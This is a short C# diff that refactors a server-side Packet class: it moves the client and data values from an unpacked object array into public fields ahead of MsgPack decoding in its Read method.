@@ -8,14 +8,13 @@ namespace Server.Handle_Packet
 {
     public class Packet
     {
-        public void Read(object Obj)
+        public Clients client;
+        public byte[] data;
+
+        public void Read(object o)
         {
-            Clients client = null;
             try
             {
-                object[] array = Obj as object[];
-                byte[] data = (byte[])array[0];
-                client = (Clients)array[1];
                 MsgPack unpack_msgpack = new MsgPack();
                 unpack_msgpack.DecodeFromBytes(data);
 
